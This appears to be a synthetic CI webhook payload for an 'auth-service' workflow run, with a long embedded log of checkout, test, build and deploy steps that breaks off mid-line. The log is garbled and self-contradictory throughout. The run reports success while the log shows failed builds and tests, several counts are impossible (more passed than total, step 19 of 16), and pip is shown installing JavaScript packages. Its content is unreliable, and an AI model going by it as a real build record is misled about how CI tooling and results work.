{
  "action": "completed",
  "workflow_run": {
    "id": 91,
    "name": "CI Pipeline",
    "head_branch": "develop",
    "head_sha": "1e68a250227877347e784f23a85f2b9919d4b489",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-19T12:46:01.995144Z",
    "updated_at": "2025-12-19T12:49:39.535185Z"
  },
  "repository": {
    "full_name": "startup-io/auth-service",
    "name": "auth-service"
  },
  "sender": {
    "login": "bob"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: deploy_production ===\n[12:46:01] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nTime: 37.24s\nConnection established\nLayer 10/15: ENV command\nWARNING: webpack has known vulnerabilities\nDone.\n[12:46:01] DEBUG: Memory usage: 1156MB\nCompiling utils/utils.go...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCoverage: 89% statements, 83% branches\n[12:46:01] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nMinifying main.js\nFetching from https://docker.io/package.json\nStep 10/15: Installing dependencies\nFAILED: test_db_connect\n\u2713 Step 'install' succeeded\npip: Installing build dependencies...\nCompiling lib/app.ts...\npip: Collecting jest\nStep 19/20: Linting\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nUploading artifact 'coverage' (29 files)\n[12:46:01] DEBUG: Memory usage: 484MB\n\u2717 build failed with exit code 114\nMinifying main.js\nMinifying main.js\nPOST /api - 200 (118ms)\nDone.\nDone.\nGET /status - 201 (88ms)\nTLS handshake completed\n\u2713 Task completed in 132ms\nStep 16/19: Building\nnpm notice: created a lockfile\n\u2713 validate completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n  PASS: unit/test_user_create.spec.js\nnpm notice: package.json updated\nCompiling components/main.py...\n\u2717 build failed with exit code 27\npip: Installing build dependencies...\nEnvironment: staging\nCompiling components/handler.rs...\nyarn add: Done in 7.81s\nVerifying...\nSnapshots: 12 passed, 41 total\nPulling image: python:3.11\nEnvironment: production\nCompiling src/main.py...\n\u2713 Task completed in 3660ms\nUsing Python 3.11\nStep 13/22: Running migrations\nDone.\nTransforming 750 files...\nCompleted.\n[12:46:01] DEBUG: Initializing service\nStep 1/23: Installing dependencies\n[12:46:01] DEBUG: Connection pool: 12 active\nUploading artifact 'dist' (10 files)\nSnapshots: 37 passed, 24 total\nTLS handshake completed\npip: Downloading webpack-5.2.tar.gz\n[12:46:01] INFO: Cache refreshed\nArtifact downloaded: 1MB\n[12:46:01] INFO: Processing request\nUploading artifact 'build' (44 files)\nUsing Node.js 17.8.0\nStep 1/20: Installing dependencies\nLoading...\nInstalling axios@4.16.7\nCompleted.\nStep 17/18: Linting\n  PASS: unit/test_db_connect.spec.js\n[12:46:02] INFO: Processing request\n[12:46:02] DEBUG: Connection pool: 11 active\nyarn add: Done in 15.64s\nGenerating source maps...\nConnection established\nCache restored successfully (467MB)\n[12:46:02] WARN: Deprecated API usage\nTests: 265 passed, 494 total\nConnection established\nDone.\nWARNING: express has known vulnerabilities\nVerifying...\nReady.\n=== Step deploy_production completed ===\n=== Step: checkout ===\n[12:46:02] INFO: Cache refreshed\nHEAD is now at ca14787\nSwitched to branch 'feature/task-559'\nChecking out main branch\nnpm notice: created a lockfile\nBundling vendor.css\nSuccess!\nWARNING: jest has known vulnerabilities\n[12:46:02] INFO: Request completed\nSuccess!\nGenerating source maps...\nSwitched to branch 'bugfix/task-641'\n\u2713 Task completed in 4858ms\n  PASS: unit/test_auth_login.spec.js\nCompiling utils/handler.rs...\nSuccess!\nAlready up to date.\nSnapshots: 43 passed, 33 total\nCompiling utils/handler.rs...\n[12:46:02] DEBUG: Memory usage: 1668MB\nCompiling components/service.java...\nReady.\nCompiling utils/service.java...\n[12:46:02] WARN: Deprecated API usage\nChecking out develop branch\nyarn add: Done in 10.92s\nAlready up to date.\nBundling runtime.js\n\u2713 deploy completed\nArtifact uploaded: dist.zip (9MB)\nStep 16/19: Linting\nArtifact uploaded: dist.zip (64MB)\nCreating production build...\nSuccess!\nConnection established\nAlready up to date.\n  PASS: test_auth_login (497ms)\nStep 10/18: Linting\nCache saved successfully\n\u2713 Step 'checkout' succeeded\nUsing Python 3.10\n[12:46:02] DEBUG: Query executed in 54ms\nLayer 2/11: COPY command\nPushing to registry...\nCache invalidated: node_modules\npip: Installing build dependencies...\nArtifact uploaded: build.tar.gz (41MB)\nStep 11/15: Building\nUsing Python 3.11\nHEAD is now at efe6211\nCompiling utils/index.js...\nnpm notice: package.json updated\n[12:46:02] DEBUG: Connection pool: 7 active\n[12:46:02] DEBUG: Connection pool: 12 active\nnpm install: added 230 packages\nPOST /data - 202 (449ms)\n[12:46:02] DEBUG: Initializing service\nChecking out master branch\n  PASS: test_db_connect (175ms)\nGenerating source maps...\nCompleted.\nCompiling src/utils.go...\nGET /status - 200 (9ms)\nArtifact downloaded: 6MB\nWaiting...\n[12:46:02] DEBUG: Query executed in 91ms\nArtifact uploaded: dist.zip (52MB)\n  PASS: integration/test_cache_hit.spec.js\nLoading...\nCompiling components/utils.go...\nCache miss for key-9177\n[12:46:02] WARN: Deprecated API usage\nFetching from https://amazonaws.com/package.json\nBundling styles.js\nReady.\n\u2713 Step 'checkout' succeeded\nStep 19/16: Linting\n[12:46:02] INFO: Starting build process\nFinished.\nPushing to registry...\n[12:46:02] WARN: Deprecated API usage\nSnapshots: 21 passed, 40 total\nCompiling lib/app.ts...\nUsing Node.js 18.6.10\n[12:46:02] DEBUG: Query executed in 43ms\nDone.\nPulling image: node:latest\nSnapshots: 28 passed, 43 total\n=== Step checkout completed ===\n=== Step: unit_tests ===\nStep 8/18: Building\n[12:46:02] INFO: Cache refreshed\nChecking out develop branch\nUploading artifact 'dist' (24 files)\nFAILED: test_api_health\nUsing Python 3.12\nConnection established\nHEAD is now at b20ee38\nCache saved successfully\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nUploading artifact 'coverage' (35 files)\nCache restored successfully (50MB)\nCoverage: 77% statements, 100% branches\nPOST /upload - 202 (446ms)\nnpm install: resolved 536 packages\nyarn add: Done in 7.86s\n[12:46:02] INFO: Starting build process\nyarn add: Done in 9.4s\n[12:46:02] INFO: Connecting to database\nWARNING: react has known vulnerabilities\nDone.\nFinished.\n[12:46:02] DEBUG: Loading configuration\nCreating production build...\nPulling image: python:latest\nArtifact uploaded: build.tar.gz (50MB)\n[12:46:02] WARN: Deprecated API usage\nStep 10/21: Building\n  PASS: test_cache_hit (113ms)\nConnection established\nGenerating source maps...\nPlatform: linux-x64\nGET /health - 200 (31ms)\nCoverage: 86% statements, 74% branches\npip: Installing build dependencies...\nStep 9/17: Building\nPOST /api - 200 (158ms)\nCoverage: 100% statements, 73% branches\nOK\nRan 194 tests in 59s\nnpm install: resolved 876 packages\n[12:46:02] INFO: Starting build process\nnpm notice: created a lockfile\nWARNING: jest has known vulnerabilities\n[12:46:02] WARN: Deprecated API usage\nStep 9/25: Installing dependencies\nStep 9/23: Installing dependencies\nWaiting...\nGenerating source maps...\nTest Suites: 47 passed, 12 total\nImage pulled successfully\nTLS handshake completed\nCache hit for key-5551\nFetching submodules...\nNODE_ENV=development\n[12:46:02] INFO: Cache refreshed\n[12:46:02] INFO: Cache refreshed\nnpm notice: created a lockfile\n[12:46:02] WARN: Deprecated API usage\nAlready up to date.\nArtifact downloaded: 36MB\nInstalling express@1.14.4\npip install: Successfully installed axios-2.16\nCache miss for key-1192\nTime: 57.265s\nImage pulled successfully\nTransforming 665 files...\nBundling styles.css\nLoading...\nCoverage: 96% statements, 79% branches\nTime: 65.281s\n[12:46:02] DEBUG: Query executed in 74ms\n\u2713 Step 'checkout' succeeded\nWaiting...\nProcessing...\nGenerating source maps...\nnpm install: resolved 1118 packages\nChecking out master branch\n[12:46:02] DEBUG: Query executed in 12ms\nnpm notice: package.json updated\nConnection established\nVerifying...\nPlatform: darwin-arm64\nUsing Python 3.9\nnpm install: resolved 1824 packages\nSwitched to branch 'hotfix/task-915'\nTransforming 571 files...\nTest Suites: 49 passed, 40 total\n=== Step unit_tests completed ===\n=== Step: install_dependencies ===\nRan 196 tests in 21s\nPOST /upload - 201 (161ms)\n\u2713 Task completed in 220ms\nStep 7/21: Running migrations\n\u2713 validate completed\nCompleted.\n[12:46:02] DEBUG: Connection pool: 19 active\n[12:46:02] DEBUG: Memory usage: 1192MB\nUploading artifact 'build' (43 files)\nNODE_ENV=development\nTransforming 569 files...\npip install: Successfully installed axios-1.7\nNODE_ENV=development\n[12:46:02] INFO: Cache refreshed\nGenerating source maps...\n[12:46:02] INFO: Starting build process\nnpm notice: created a lockfile\nFetching from https://registry.npmjs.org/package.json\n  PASS: test_db_connect (467ms)\nException: ValueError\nStep 3/25: Running migrations\n[12:46:02] INFO: Processing request\nStep 11/18: Running migrations\nReady.\nCache miss for key-4952\nPOST /api - 202 (438ms)\nSwitched to branch 'feature/task-103'\nBuilding Docker image...\nCreating production build...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:46:02] DEBUG: Connection pool: 7 active\n[12:46:02] INFO: Cache refreshed\n[12:46:02] WARN: Deprecated API usage\n\u2713 All checks passed\nWARNING: axios has known vulnerabilities\nRan 156 tests in 21s\n[12:46:02] DEBUG: Connection pool: 14 active\nPlatform: linux-x64\n[12:46:02] INFO: Cache refreshed\nCache invalidated: build\n[12:46:02] INFO: Starting build process\nUsing Node.js 20.3.6\nCompleted.\nBuilding Docker image...\nWaiting...\nStep 18/24: Deploying\nException: RuntimeError\nnpm install: added 440 packages\n[12:46:02] DEBUG: Memory usage: 1146MB\nWARNING: eslint has known vulnerabilities\nWARNING: react has known vulnerabilities\nCompiling components/main.py...\nPlatform: win32-x64\nNODE_ENV=development\nAlready up to date.\nEnvironment: production\nnpm install: added 227 packages\n[12:46:02] INFO: Processing request\nCoverage: 81% statements, 82% branches\n[12:46:02] INFO: Request completed\nInstalling react@3.14.0\nLayer 8/15: RUN command\n[12:46:02] INFO: Processing request\nArtifact uploaded: build.tar.gz (35MB)\nnpm install: resolved 500 packages\npip: Collecting eslint\nUsing Python 3.9\n[12:46:02] DEBUG: Connection pool: 11 active\nCompiling lib/handler.rs...\n[12:46:02] DEBUG: Memory usage: 1149MB\n  PASS: test_user_create (5ms)\nWARNING: webpack has known vulnerabilities\nStep 8/21: Installing dependencies\npip: Installing build dependencies...\nEnvironment: development\nArtifact uploaded: dist.zip (31MB)\nHEAD is now at 11e3a58\nTLS handshake completed\nDone.\nTest Suites: 39 passed, 46 total\nTest Suites: 5 passed, 31 total\nAlready up to date.\nCreating production build...\nLoading...\nArtifact downloaded: 21MB\nPulling image: alpine:18\nOK\nTLS handshake completed\n=== Step install_dependencies completed ===\n=== Step: upload_artifacts ===\nMinifying vendor.js\n[12:46:02] DEBUG: Connection pool: 19 active\nTest Suites: 7 passed, 31 total\nPushing to registry...\nCache hit for key-5099\nTime: 58.26s\nHEAD is now at 869e700\nUploading artifact 'coverage' (24 files)\nCache restored successfully (45MB)\nArtifact uploaded: dist.zip (77MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:46:02] WARN: Deprecated API usage\nRan 182 tests in 47s\nCreating production build...\n\u2713 Step 'setup' succeeded\nSwitched to branch 'bugfix/task-678'\nUploading artifact 'build' (44 files)\nSwitched to branch 'hotfix/task-965'\nCompiling lib/service.java...\nStep 19/20: Installing dependencies\nCache hit for key-9220\nnpm install: resolved 115 packages\nGET /api - 200 (44ms)\nnpm notice: package.json updated\nProcessing...\nCompiling src/service.java...\nFAILED: test_api_health\nBundling main.js\nCache invalidated: dependencies\nCoverage: 75% statements, 99% branches\nCache hit for key-4631\nInstalling eslint@4.7.9\nReady.\nTests: 388 passed, 119 total\n\u2713 Step 'checkout' succeeded\nFetching submodules...\nTest Suites: 24 passed, 11 total\nSuccess!\nCreating production build...\nPOST /data - 200 (10ms)\nGET /status - 200 (29ms)\nArtifact downloaded: 50MB\nOptimizing 89 modules...\nTransforming 840 files...\npip: Collecting eslint\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nTransforming 542 files...\nStep 9/21: Linting\n[12:46:02] WARN: Deprecated API usage\nBundling styles.js\nArtifact downloaded: 19MB\nnpm notice: created a lockfile\nImage pulled successfully\nCache restored successfully (86MB)\nSnapshots: 12 passed, 16 total\n[12:46:02] INFO: Processing request\n[12:46:02] WARN: Deprecated API usage\nException: RuntimeError\nHEAD is now at b158380\nDone.\nCompiling components/main.py...\n  PASS: test_db_connect (406ms)\nPushing to registry...\nTransforming 266 files...\nnpm notice: created a lockfile\nSuccess!\nUploading artifact 'build' (49 files)\npip: Collecting jest\n[12:46:02] INFO: Starting build process\nVerifying...\nPOST /data - 200 (257ms)\nUploading artifact 'coverage' (47 files)\nInstalling lodash@1.15.7\nBundling main.css\n\u2717 build failed with exit code 22\nNODE_ENV=production\nFAILED: test_user_create\nUploading artifact 'dist' (10 files)\nSwitched to branch 'hotfix/task-465'\nBundling styles.js\nPulling image: alpine:18\n[12:46:02] WARN: Deprecated API usage\n[12:46:02] ERROR: Connection failed\nWARNING: lodash has known vulnerabilities\nTest Suites: 17 passed, 22 total\nOptimizing 11 modules...\nStep 4/23: Running migrations\nTime: 91.147s\n=== Step upload_artifacts completed ===\n=== Step: restore_cache ===\nArtifact uploaded: dist.zip (46MB)\nTime: 66.804s\n\u2713 test completed\nChecking out develop branch\nBuilding Docker image...\npip: Downloading jest-5.19.tar.gz\nCache miss for key-6992\nStep 7/19: Running migrations\nTests: 322 passed, 230 total\nImage pulled successfully\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\npip: Collecting jest\n[12:46:02] WARN: Deprecated API usage\n[12:46:02] INFO: Processing request\nAlready up to date.\n[12:46:02] DEBUG: Memory usage: 174MB\nArtifact uploaded: dist.zip (61MB)\n\u2713 All checks passed\npip: Installing build dependencies...\nCompiling components/main.py...\npip: Collecting webpack\nCache miss for key-3400\nUsing Node.js 17.4.7\nnpm install: resolved 385 packages\nSuccess!\npip: Downloading webpack-1.13.tar.gz\npip: Installing build dependencies...\nnpm install: resolved 774 packages\nCompiling components/app.ts...\nRan 59 tests in 36s\nWARNING: lodash has known vulnerabilities\nGET /api - 200 (75ms)\n[12:46:02] WARN: Deprecated API usage\nFetching submodules...\nCache saved successfully\npip: Downloading axios-1.10.tar.gz\n[12:46:02] DEBUG: Initializing service\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:46:02] INFO: Starting build process\nCompiling utils/service.java...\nException: RuntimeError\nCache miss for key-7303\nUploading artifact 'build' (26 files)\nUsing Node.js 17.5.8\nnpm install: added 58 packages\nArtifact uploaded: build.tar.gz (34MB)\nTransforming 287 files...\nWARNING: axios has known vulnerabilities\nCache miss for key-6684\nChecking out develop branch\nTLS handshake completed\nPlatform: linux-x64\nArtifact downloaded: 7MB\nAlready up to date.\nFinished.\nImage pulled successfully\npip: Installing build dependencies...\nArtifact uploaded: build.tar.gz (3MB)\nArtifact downloaded: 25MB\nStep 10/23: Testing\nnpm notice: created a lockfile\n[12:46:02] DEBUG: Query executed in 38ms\n[12:46:02] INFO: Connecting to database\nSuccess!\n[12:46:02] WARN: Deprecated API usage\nSuccess!\nTransforming 509 files...\nMinifying main.js\n[12:46:02] DEBUG: Memory usage: 953MB\npip: Downloading webpack-2.11.tar.gz\nUsing Python 3.12\nCache hit for key-7776\nStep 20/18: Running migrations\n\u2713 build completed\nLayer 6/13: RUN command\n[12:46:02] INFO: Processing request\nPOST /data - 200 (177ms)\nCache miss for key-4844\nCache invalidated: node_modules\nLoading...\nOptimizing 27 modules...\nArtifact downloaded: 13MB\nImage pulled successfully\nStep 15/17: Deploying\npip: Installing build dependencies...\nTime: 48.671s\n=== Step restore_cache completed ===\n=== Step: integration_tests ===\nnpm notice: package.json updated\n[12:46:02] DEBUG: Connection pool: 15 active\nnpm notice: package.json updated\nTest Suites: 16 passed, 32 total\nSuccess!\nNODE_ENV=development\n[12:46:02] INFO: Processing request\nCompiling lib/app.ts...\n[12:46:02] WARN: Deprecated API usage\nnpm install: added 104 packages\n[12:46:02] DEBUG: Memory usage: 437MB\nSuccess!\nSnapshots: 33 passed, 11 total\nCache hit for key-4561\nUploading artifact 'coverage' (6 files)\nConnection established\nFAILED: test_user_create\nFinished.\nVerifying...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache miss for key-1046\n  PASS: test_user_create (187ms)\nAlready up to date.\nWARNING: express has known vulnerabilities\n[12:46:02] INFO: Cache refreshed\n  PASS: unit/test_api_health.spec.js\nTransforming 579 files...\nyarn add: Done in 19.84s\nImage pulled successfully\nTime: 97.941s\nOptimizing 61 modules...\n[12:46:02] INFO: Connecting to database\n[12:46:02] DEBUG: Loading configuration\nPlatform: win32-x64\nCompiling src/app.ts...\nConnection established\nCoverage: 82% statements, 70% branches\nWARNING: prettier has known vulnerabilities\nTests: 251 passed, 178 total\nUsing Python 3.10\n[12:46:02] INFO: Connecting to database\nCache hit for key-9990\nGenerating source maps...\nCompiling utils/service.java...\nCache saved successfully\n[12:46:02] DEBUG: Loading configuration\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTest Suites: 47 passed, 8 total\nStep 15/22: Building\nStep 16/21: Installing dependencies\nLayer 6/12: COPY command\n[12:46:02] INFO: Starting build process\nCache invalidated: build\nnpm notice: package.json updated\nBuilding Docker image...\nPlatform: darwin-arm64\nFinished.\nNODE_ENV=development\nUsing Python 3.12\n[12:46:02] WARN: Deprecated API usage\npip: Collecting react\nTest Suites: 15 passed, 14 total\n[12:46:02] WARN: Deprecated API usage\nTest Suites: 36 passed, 14 total\nTest Suites: 9 passed, 17 total\nArtifact uploaded: dist.zip (72MB)\nDone.\nLayer 4/9: ENV command\nTest Suites: 11 passed, 19 total\nCreating production build...\n\u2713 All checks passed\nStep 16/16: Installing dependencies\n[12:46:02] DEBUG: Query executed in 65ms\n  PASS: test_user_create (200ms)\nnpm install: resolved 743 packages\nGenerating source maps...\nCompiling utils/app.ts...\nnpm notice: created a lockfile\n[12:46:02] INFO: Connecting to database\nFinished.\nCache saved successfully\n\u2713 Step 'setup' succeeded\nStep 4/18: Building\n\u2713 package completed\nPushing to registry...\n[12:46:02] DEBUG: Query executed in 4ms\n=== Step integration_tests completed ===\n=== Step: setup_environment ===\npip install: Successfully installed react-1.1\npip: Downloading prettier-2.9.tar.gz\nnpm install: added 48 packages\nHEAD is now at 92e36b1\nnpm notice: package.json updated\n[12:46:02] DEBUG: Initializing service\nBuilding Docker image...\nTLS handshake completed\nNODE_ENV=development\n[12:46:02] DEBUG: Connection pool: 10 active\nWARNING: prettier has known vulnerabilities\nCoverage: 78% statements, 95% branches\nCompleted.\nMinifying vendor.js\nDone.\nChecking out develop branch\n  PASS: integration/test_db_connect.spec.js\nCache saved successfully\nTests: 203 passed, 183 total\nUsing Python 3.9\n[12:46:02] INFO: Processing request\nException: NullPointerException\npip: Installing build dependencies...\nBuilding Docker image...\n\u2713 Task completed in 3632ms\nPlatform: win32-x64\nArtifact uploaded: dist.zip (96MB)\nFetching submodules...\n\u2713 Task completed in 1095ms\nDone.\nArtifact downloaded: 11MB\nGenerating source maps...\n\u2713 Task completed in 940ms\nnpm notice: created a lockfile\nnpm notice: package.json updated\nFetching from https://npmjs.org/package.json\nWARNING: eslint has known vulnerabilities\nCache miss for key-8654\nCreating production build...\nConnection established\nStep 7/17: Building\nWARNING: jest has known vulnerabilities\nInstalling express@1.3.1\nPlatform: win32-x64\n[12:46:02] INFO: Processing request\n[12:46:02] WARN: Deprecated API usage\nPulling image: alpine:latest\nyarn add: Done in 6.1s\nStep 16/25: Building\nnpm notice: created a lockfile\nUsing Python 3.10\nStep 19/21: Installing dependencies\nArtifact uploaded: dist.zip (72MB)\nCompiling utils/index.js...\nUsing Node.js 18.0.6\nSnapshots: 9 passed, 28 total\n[12:46:02] INFO: Processing request\npip: Collecting jest\nGenerating source maps...\nCompiling utils/service.java...\nCache miss for key-1700\nCompiling src/main.py...\npip: Collecting axios\nNODE_ENV=production\n\u2717 build failed with exit code 28\nReady.\npip: Collecting express\nPushing to registry...\nStep 8/19: Installing dependencies\n[12:46:02] INFO: Request completed\npip install: Successfully installed eslint-3.19\nBundling vendor.js\nDone.\nCompleted.\nFetching submodules...\nnpm install: added 140 packages\n  PASS: test_user_create (433ms)\nnpm notice: package.json updated\nBuilding Docker image...\nFetching submodules...\nCache invalidated: build\nRan 109 tests in 14s\nTransforming 488 files...\nProcessing...\n[12:46:02] DEBUG: Loading configuration\nGenerating source maps...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:46:02] INFO: Cache refreshed\n=== Step setup_environment completed ===\n=== Step: save_cache ===\nStep 3/16: Deploying\nImage pulled successfully\n[12:46:02] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWARNING: eslint has known vulnerabilities\nReady.\nPlatform: win32-x64\nTests: 51 passed, 187 total\npip: Collecting axios\nGET /health - 201 (38ms)\n[12:46:02] DEBUG: Query executed in 1ms\nnpm notice: package.json updated\nTests: 84 passed, 88 total\nWARNING: webpack has known vulnerabilities\nArtifact downloaded: 4MB\nHEAD is now at 0e78c2b\nVerifying...\nStep 15/21: Installing dependencies\nAlready up to date.\nProcessing...\nNODE_ENV=development\nPulling image: node:3.11\nStep 17/23: Testing\nDone.\npip install: Successfully installed jest-2.19\nFetching submodules...\nCompiling utils/index.js...\nStep 19/21: Linting\nTest Suites: 16 passed, 46 total\nCompleted.\nPlatform: darwin-arm64\nFetching submodules...\npip: Collecting webpack\n[12:46:02] DEBUG: Loading configuration\nConnection established\nDone.\nMinifying vendor.js\nArtifact downloaded: 23MB\n[12:46:02] WARN: Deprecated API usage\nWaiting...\n[12:46:02] DEBUG: Connection pool: 18 active\nReady.\n[12:46:02] INFO: Request completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 15/25: Testing\nEnvironment: staging\nInstalling express@5.6.2\nDone.\nCache saved successfully\nyarn add: Done in 11.36s\nHEAD is now at 0baca95\nPulling image: alpine:18\npip: Downloading jest-5.17.tar.gz\n  PASS: test_user_create (335ms)\nVerifying...\nTLS handshake completed\nnpm install: added 300 packages\nWaiting...\nWARNING: jest has known vulnerabilities\nImage pulled successfully\nLoading...\nSuccess!\nTransforming 616 files...\nArtifact uploaded: build.tar.gz (24MB)\nnpm notice: package.json updated\n\u2713 Task completed in 1402ms\nCoverage: 92% statements, 71% branches\nLoading...\nUsing Python 3.11\n[12:46:02] DEBUG: Loading configuration\n[12:46:02] INFO: Cache refreshed\nCompleted.\n[12:46:02] DEBUG: Loading configuration\n  PASS: e2e/test_api_health.spec.js\nCoverage: 77% statements, 90% branches\nnpm notice: created a lockfile\n\u2713 Task completed in 4323ms\nHEAD is now at 773b90e\nBuilding Docker image...\n[12:46:02] INFO: Processing request\nTLS handshake completed\nWaiting...\nArtifact downloaded: 19MB\nImage pulled successfully\nUsing Node.js 18.5.8\n\u2713 Task completed in 4998ms\n[12:46:02] DEBUG: Loading configuration\nPlatform: win32-x64\n=== Step save_cache completed ===\n=== Step: deploy_staging ===\nChecking out main branch\nCache saved successfully\n[12:46:02] DEBUG: Loading configuration\nHEAD is now at ea3d305\n\u2713 All checks passed\n[12:46:02] DEBUG: Query executed in 44ms\nUploading artifact 'build' (37 files)\nUsing Python 3.11\nTransforming 213 files...\nCompiling lib/index.js...\n[12:46:02] DEBUG: Memory usage: 1322MB\n  PASS: integration/test_api_health.spec.js\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nGenerating source maps...\n[12:46:02] ERROR: Connection failed\n[12:46:02] DEBUG: Connection pool: 8 active\nLayer 2/11: COPY command\nCompiling lib/utils.go...\nPushing to registry...\nnpm notice: created a lockfile\nStep 16/21: Running migrations\n\u2713 All checks passed\n[12:46:02] WARN: Deprecated API usage\nStep 13/21: Installing dependencies\n\u2713 Step 'test' succeeded\nProcessing...\nCompiling components/service.java...\nMinifying vendor.js\n[12:46:02] INFO: Connecting to database\nStep 19/25: Testing\nCreating production build...\nTest Suites: 23 passed, 37 total\nSnapshots: 42 passed, 11 total\nImage pulled successfully\nSwitched to branch 'bugfix/task-741'\nPulling image: python:18\n\u2717 build failed with exit code 79\nConnection established\n[12:46:02] DEBUG: Connection pool: 15 active\n[12:46:02] WARN: Deprecated API usage\nPOST /upload - 201 (278ms)\nGenerating source maps...\nnpm install: added 267 packages\nGET /api - 204 (55ms)\nTransforming 592 files...\nChecking out main branch\n[12:46:02] ERROR: Connection failed\nCache hit for key-2247\n[12:46:02] WARN: Deprecated API usage\nWaiting...\nnpm install: resolved 120 packages\nTime: 108.206s\n[12:46:02] ERROR: Connection failed\nUsing Node.js 19.8.6\n[12:46:02] DEBUG: Initializing service\n[12:46:02] DEBUG: Initializing service\nUsing Python 3.10\nOptimizing 46 modules...\n[12:46:02] INFO: Cache refreshed\nCoverage: 89% statements, 81% branches\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nyarn add: Done in 24.64s\nTransforming 964 files...\n[12:46:02] INFO: Connecting to database\nnpm install: added 423 packages\nPulling image: node:18\nFetching from https://gcr.io/package.json\nnpm notice: created a lockfile\nWARNING: webpack has known vulnerabilities\n  PASS: unit/test_auth_login.spec.js\nWARNING: lodash has known vulnerabilities\nPlatform: win32-x64\nChecking out main branch\nnpm notice: package.json updated\nStep 7/16: Testing\nSnapshots: 27 passed, 18 total\nCompiling src/service.java...\nOK\nGET /api - 201 (56ms)\nUsing Node.js 20.4.0\nEnvironment: production\npip: Collecting prettier\npip: Downloading webpack-3.16.tar.gz\nBundling runtime.js\n[12:46:02] INFO: Request completed\nCache saved successfully\n[12:46:02] DEBUG: Memory usage: 1399MB\nHEAD is now at 980fabb\n=== Step deploy_staging completed ===\n=== Step: build ===\nCompiling src/index.js...\nCompiling src/main.py...\nCompiling components/service.java...\nArtifact uploaded: dist.zip (50MB)\nCache hit for key-9552\npip: Downloading webpack-1.20.tar.gz\n[12:46:02] DEBUG: Loading configuration\nException: NullPointerException\nStep 11/22: Installing dependencies\nStep 18/22: Installing dependencies\nCompiling lib/app.ts...\nCompiling utils/service.java...\nAlready up to date.\nLayer 2/10: ENV command\nHEAD is now at b67e2de\nStep 9/20: Installing dependencies\n\u2713 Step 'test' succeeded\nCompleted.\n[12:46:02] ERROR: Connection failed\nyarn add: Done in 20.31s\nLayer 1/11: ENV command\nBundling vendor.js\n\u2713 lint completed\nCompiling utils/app.ts...\nCompiling components/index.js...\nPushing to registry...\nTime: 120.429s\n[12:46:02] DEBUG: Initializing service\nCache hit for key-7440\nOptimizing 91 modules...\nCompiling lib/app.ts...\n[12:46:02] DEBUG: Connection pool: 16 active\nTransforming 463 files...\nStep 3/24: Testing\n[12:46:02] ERROR: Connection failed\n[12:46:02] DEBUG: Memory usage: 1118MB\n[12:46:02] WARN: Deprecated API usage\nFinished.\nnpm install: added 80 packages\nFAILED: test_db_connect\nVerifying...\nCache invalidated: build\nAlready up to date.\nStep 5/20: Installing dependencies\nArtifact uploaded: build.tar.gz (35MB)\nUploading artifact 'coverage' (18 files)\n  PASS: unit/test_user_create.spec.js\nOK\nEnvironment: staging\n[12:46:02] WARN: Deprecated API usage\nMinifying main.js\nInstalling jest@5.13.6\nyarn add: Done in 10.84s\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCoverage: 74% statements, 96% branches\n\u2713 Task completed in 3352ms\nTime: 55.696s\nWARNING: prettier has known vulnerabilities\nCache invalidated: node_modules\nCache hit for key-1763\nNODE_ENV=production\nNODE_ENV=development\nCache invalidated: dependencies\n\u2713 validate completed\nLoading...\nCache miss for key-1583\nStep 1/19: Building\nArtifact downloaded: 30MB\nStep 3/15: Deploying\nCompiling src/service.java...\nReady.\nOptimizing 26 modules...\nStep 19/16: Installing dependencies\nUploading artifact 'coverage' (25 files)\nnpm install: added 249 packages\nPulling image: python:3.11\nArtifact downloaded: 38MB\nBuilding Docker image...\n\u2713 All checks passed\nUsing Node.js 20.7.1\nOK\n\u2713 deploy completed\nSwitched to branch 'bugfix/task-606'\nPushing to registry...\nMinifying vendor.js\n[12:46:02] INFO: Request completed\nnpm install: added 179 packages\nCompleted.\n=== Step build completed ===\n=== Step: type_check ===\nPOST /api - 201 (182ms)\nVerifying...\nBundling vendor.css\nTest Suites: 15 passed, 12 total\nnpm install: resolved 1800 packages\nCompiling components/main.py...\npip: Downloading react-3.10.tar.gz\nPushing to registry...\n\u2713 All checks passed\n[12:46:02] ERROR: Connection failed\n[12:46:02] INFO: Request completed\nCache saved successfully\n[12:46:02] WARN: Deprecated API usage\n[12:46:02] INFO: Connecting to database\nConnection established\nCompiling components/handler.rs...\nGET /api - 204 (77ms)\n[12:46:02] DEBUG: Initializing service\nnpm notice: created a lockfile\n[12:46:02] DEBUG: Memory usage: 1840MB\nMinifying main.js\nCache restored successfully (298MB)\nCompiling components/app.ts...\nFetching submodules...\nInstalling express@5.11.8\n[12:46:02] WARN: Deprecated API usage\nGenerating source maps...\nSnapshots: 46 passed, 2 total\nCache miss for key-8959\npip: Collecting jest\nSwitched to branch 'feature/task-837'\npip: Downloading express-1.18.tar.gz\nStep 17/15: Building\nStep 15/18: Building\n[12:46:02] INFO: Connecting to database\n[12:46:02] DEBUG: Initializing service\nUsing Node.js 14.0.8\n[12:46:02] ERROR: Connection failed\nLoading...\n\u2713 Task completed in 1573ms\nInstalling axios@3.20.10\nCompiling lib/handler.rs...\n\u2717 build failed with exit code 111\nAlready up to date.\nInstalling express@4.18.7\nBuilding Docker image...\n  PASS: test_auth_login (223ms)\nInstalling prettier@3.1.2\nStep 12/17: Deploying\n[12:46:02] DEBUG: Query executed in 